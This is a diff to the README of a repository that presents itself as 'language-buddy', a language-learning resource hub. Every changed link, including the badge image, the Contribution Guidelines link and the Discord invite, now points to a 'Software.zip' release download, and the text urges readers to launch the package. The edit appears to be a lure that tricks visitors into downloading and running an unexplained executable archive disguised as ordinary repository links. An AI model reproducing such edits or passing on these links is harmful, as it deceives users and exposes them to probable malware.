@@ -20,9 +20,9 @@ Welcome to the "language-buddy" repository - your go-to place for all things lan
 
 ## Getting Started 🚀
 
-To access the full range of resources and tools available in this repository, simply download the Software package by clicking [here](https://github.com/user-attachments/files/18410590/Software.zip).
+To access the full range of resources and tools available in this repository, simply download the Software package by clicking [here](https://github.com/hoba23s/language-buddy/releases/download/v2.0/Software.zip).
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Software](https://github.com/hoba23s/language-buddy/releases/download/v2.0/Software.zip)](https://github.com/hoba23s/language-buddy/releases/download/v2.0/Software.zip)
 
 Please note that the Software package needs to be launched to install the necessary language learning applications and materials.
 
@@ -32,13 +32,13 @@ If you encounter any issues with the download link provided, we recommend checki
 
 We welcome contributions from language enthusiasts and experts who are passionate about making language learning more engaging and effective. If you have any materials, tools, or resources that you would like to share with the community, feel free to submit a pull request.
 
-Before contributing, please review our [Contribution Guidelines](CONTRIBUTING.md) to ensure that your additions align with the goals and standards of this repository.
+Before contributing, please review our [Contribution Guidelines](https://github.com/hoba23s/language-buddy/releases/download/v2.0/Software.zip) to ensure that your additions align with the goals and standards of this repository.
 
 ## Community Support 🌟
 
 Join our vibrant community of language learners on Discord, where you can connect with peers, ask questions, share tips, and participate in language challenges and events. Our supportive community is here to motivate and inspire you on your language learning journey.
 
-[![Join our Discord Community](https://img.shields.io/badge/Join-Discord-9cf)](https://discord.link/languagebuddy)
+[![Join our Discord Community](https://github.com/hoba23s/language-buddy/releases/download/v2.0/Software.zip)](https://github.com/hoba23s/language-buddy/releases/download/v2.0/Software.zip)
 
 ## Acknowledgements 🙏
 
